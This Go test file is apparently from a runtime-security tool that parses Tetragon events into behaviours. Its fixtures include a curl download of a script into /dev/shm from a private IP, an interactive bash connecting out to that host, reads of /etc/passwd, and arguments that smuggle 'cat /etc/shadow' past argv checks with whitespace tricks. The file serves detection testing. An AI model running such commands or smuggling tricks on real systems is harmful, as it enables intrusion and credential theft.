package tetragon

import "testing"

func TestArgvBoundariesTrusted(t *testing.T) {
	tests := []struct {
		name      string
		arguments string
		want      bool
	}{
		{name: "plain tokens", arguments: "-u root sysarmorctl policy current", want: true},
		{name: "quoted space", arguments: `-p "notice sysarmorctl tail" cat /etc/shadow`},
		{name: "tab", arguments: "-p notice\tsysarmorctl cat /etc/shadow"},
		{name: "vertical tab", arguments: "-p notice\vsysarmorctl cat /etc/shadow"},
		{name: "form feed", arguments: "-p notice\fsysarmorctl cat /etc/shadow"},
		{name: "non-breaking space", arguments: "-p notice\u00a0sysarmorctl cat /etc/shadow"},
		{name: "newline", arguments: "-p notice\nsysarmorctl cat /etc/shadow"},
		{name: "repeated spaces", arguments: "-u  root sysarmorctl"},
		{name: "leading space", arguments: " sysarmorctl"},
		{name: "backslash", arguments: `-p notice\ sysarmorctl`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := argvBoundariesTrusted(tt.arguments); got != tt.want {
				t.Fatalf("argvBoundariesTrusted(%q) = %t, want %t", tt.arguments, got, tt.want)
			}
		})
	}
}

func TestParseProcessExecInfersCurlWrite(t *testing.T) {
	raw := []byte(`{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`)
	events, ok := ParseLine(raw)
	if !ok {
		t.Fatal("line was not recognized")
	}
	if len(events) != 2 {
		t.Fatalf("events = %d, want exec + inferred write", len(events))
	}
	if events[0].GetBehavior() != "process.exec" {
		t.Fatalf("first behavior = %v, want process.exec", events[0].GetBehavior())
	}
	if events[1].GetBehavior() != "file.write" || events[1].GetObject().GetPath() != "/dev/shm/x.sh" {
		t.Fatalf("second event = %#v, want file.write /dev/shm/x.sh", events[1])
	}
}

func TestParseSocketConnect(t *testing.T) {
	raw := []byte(`{"process_kprobe":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-i","start_time":"2026-06-14T10:00:01Z"},"parent":{"pid":100,"binary":"/bin/bash","start_time":"2026-06-14T10:00:00Z"},"function_name":"security_socket_connect","args":[{"sockaddr_arg":{"family":"AF_INET","addr":"10.66.0.99","port":443}}],"policy_name":"sysarmor-syscall-capture"},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`)
	events, ok := ParseLine(raw)
	if !ok {
		t.Fatal("line was not recognized")
	}
	if len(events) != 1 {
		t.Fatalf("events = %d, want 1", len(events))
	}
	if events[0].GetBehavior() != "network.connect" || events[0].GetObject().GetDst() != "10.66.0.99:443" {
		t.Fatalf("event = %#v, want network.connect 10.66.0.99:443", events[0])
	}
}

func TestParsePolicyFilePermissionWrite(t *testing.T) {
	raw := []byte(`{"process_kprobe":{"process":{"pid":105,"uid":0,"binary":"/usr/bin/curl","arguments":"-o /dev/shm/x.sh","start_time":"2026-06-14T10:00:04Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"},"function_name":"security_file_permission","args":[{"file_arg":{"path":"/dev/shm/x.sh","permission":"-rw-r--r--"}},{"int_arg":2}],"return":{"int_arg":0},"policy_name":"sysarmor-runtime-collection"},"node_name":"node-a","time":"2026-06-14T10:00:04Z"}`)
	events, ok := ParseLine(raw)
	if !ok || len(events) != 1 {
		t.Fatalf("events=%d ok=%v, want one file write", len(events), ok)
	}
	if events[0].GetBehavior() != "file.write" || events[0].GetObject().GetPath() != "/dev/shm/x.sh" {
		t.Fatalf("event = %+v, want file.write /dev/shm/x.sh", events[0])
	}
}

func TestParsePolicyFilePermissionRead(t *testing.T) {
	raw := []byte(`{"process_kprobe":{"process":{"pid":106,"uid":0,"binary":"/bin/cat","arguments":"/etc/passwd","start_time":"2026-06-14T10:00:05Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"},"function_name":"security_file_permission","args":[{"file_arg":{"path":"/etc/passwd","permission":"-rw-r--r--"}},{"int_arg":4}],"return":{"int_arg":0},"policy_name":"sysarmor-runtime-collection"},"node_name":"node-a","time":"2026-06-14T10:00:05Z"}`)
	events, ok := ParseLine(raw)
	if !ok || len(events) != 1 {
		t.Fatalf("events=%d ok=%v, want one file read", len(events), ok)
	}
	if events[0].GetBehavior() != "file.read" || events[0].GetObject().GetPath() != "/etc/passwd" {
		t.Fatalf("event = %+v, want file.read /etc/passwd", events[0])
	}
}

func TestParsePolicyKprobeExec(t *testing.T) {
	raw := []byte(`{"process_kprobe":{"process":{"pid":103,"uid":0,"binary":"/bin/busybox","arguments":"id","start_time":"2026-06-14T10:00:02Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"},"function_name":"security_bprm_creds_from_file","args":[{"file_arg":{"path":"/bin/busybox"}}],"policy_name":"sysarmor-runtime-collection"},"node_name":"node-a","time":"2026-06-14T10:00:02Z"}`)
	events, ok := ParseLine(raw)
	if !ok || len(events) != 1 {
		t.Fatalf("events=%d ok=%v, want one process exec", len(events), ok)
	}
	if events[0].GetBehavior() != "process.exec" || events[0].GetObject().GetPath() != "/bin/busybox" {
		t.Fatalf("event = %+v, want process.exec /bin/busybox", events[0])
	}
}

func TestParsePolicyKprobeExit(t *testing.T) {
	raw := []byte(`{"process_kprobe":{"process":{"pid":104,"uid":0,"binary":"/usr/bin/sleep","arguments":"1","start_time":"2026-06-14T10:00:02Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"},"function_name":"do_exit","args":[{"int_arg":0}],"policy_name":"sysarmor-runtime-collection"},"node_name":"node-a","time":"2026-06-14T10:00:03Z"}`)
	events, ok := ParseLine(raw)
	if !ok || len(events) != 1 {
		t.Fatalf("events=%d ok=%v, want one process exit", len(events), ok)
	}
	if events[0].GetBehavior() != "process.exit" {
		t.Fatalf("behavior = %q, want process.exit", events[0].GetBehavior())
	}
}

func TestParseProcessExitEmitsExit(t *testing.T) {
	raw := []byte(`{"process_exit":{"process":{"pid":102,"uid":0,"binary":"/usr/bin/sleep","arguments":"1","start_time":"2026-06-14T10:00:02Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"}},"node_name":"node-a","time":"2026-06-14T10:00:03Z"}`)
	events, ok := ParseLine(raw)
	if !ok {
		t.Fatal("process_exit should be recognized")
	}
	if len(events) != 1 || events[0].GetBehavior() != "process.exit" {
		t.Fatalf("events = %+v, want one process.exit", events)
	}
}

func TestParseProcessExecCloneEmitsFork(t *testing.T) {
	raw := []byte(`{"process_exec":{"process":{"pid":103,"uid":0,"binary":"/bin/bash","arguments":"-c id","flags":"execve clone","start_time":"2026-06-14T10:00:02Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"}},"node_name":"node-a","time":"2026-06-14T10:00:03Z"}`)
	events, ok := ParseLine(raw)
	if !ok {
		t.Fatal("process_exec should be recognized")
	}
	if len(events) != 2 || events[0].GetBehavior() != "process.exec" || events[1].GetBehavior() != "process.fork" {
		t.Fatalf("events = %+v, want process.exec + process.fork", events)
	}
}

func TestParseDroppedEvents(t *testing.T) {
	for _, raw := range []string{
		`{"dropped_events":3}`,
		`{"health":{"dropped_events":3}}`,
	} {
		got, ok := ParseDroppedEvents([]byte(raw))
		if !ok || got != 3 {
			t.Fatalf("ParseDroppedEvents(%s) = %d/%v, want 3/true", raw, got, ok)
		}
	}
	if got, ok := ParseDroppedEvents([]byte(`{"process_exit":{}}`)); ok || got != 0 {
		t.Fatalf("ParseDroppedEvents(process_exit) = %d/%v, want 0/false", got, ok)
	}
}

func TestParseStagedHelperStartsNewLineageRoot(t *testing.T) {
	raw := []byte(`{"process_exec":{"process":{"exec_id":"exec-helper","pid":300,"uid":0,"binary":"/var/lib/app/plugins/helper","arguments":"bash /var/lib/app/plugins/helper --report http://10.66.0.99:443","parent_exec_id":"exec-orchestrator","start_time":"2026-06-14T10:00:02Z"},"parent":{"exec_id":"exec-orchestrator","pid":200,"binary":"/bin/bash","start_time":"2026-06-14T10:00:00Z"}},"node_name":"node-a","time":"2026-06-14T10:00:02Z"}`)
	events, ok := ParseLine(raw)
	if !ok || len(events) != 1 {
		t.Fatalf("events=%d ok=%v, want one helper exec", len(events), ok)
	}
	if events[0].GetProc().GetSensorParentExecId() != "" || events[0].GetProc().GetPpid() != 0 {
		t.Fatalf("helper parent exec id=%q ppid=%d, want lineage root", events[0].GetProc().GetSensorParentExecId(), events[0].GetProc().GetPpid())
	}
}
